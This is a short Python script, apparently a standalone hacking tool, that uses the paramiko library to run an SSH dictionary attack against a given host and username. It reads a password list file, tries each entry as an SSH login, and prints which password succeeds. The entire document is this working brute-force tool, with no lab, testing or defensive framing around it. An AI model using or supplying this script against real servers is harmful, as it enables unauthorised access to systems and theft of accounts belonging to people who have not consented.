import paramiko
import argparse

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

parser = argparse.ArgumentParser(description="SSH dictionary attack.")
parser.add_argument("host", help="Hostname or IP Address")
parser.add_argument("-w", "--password_list", help="Password list.")
parser.add_argument("-u", "--username", help="Host username.")
parser.add_argument("-p", "--port", help="Port number.")


args = parser.parse_args()
host = args.host
password_list = args.password_list
username = args.username
port = args.port if args.port else 22


if(not all([host, username, port, password_list])):
    print(parser.print_usage())
    exit()

try:
    password_list = open(password_list, 'r')
    for password in password_list.readlines():
        password = password.strip('\n')
        try:
            client.connect(hostname=host, port=port, username=username, password=password)
            print('[+] Logged in successfully with ' + password)
        except Exception as exception:
            print('[-] Failed to login with ' + password)

except KeyboardInterrupt:
    print("")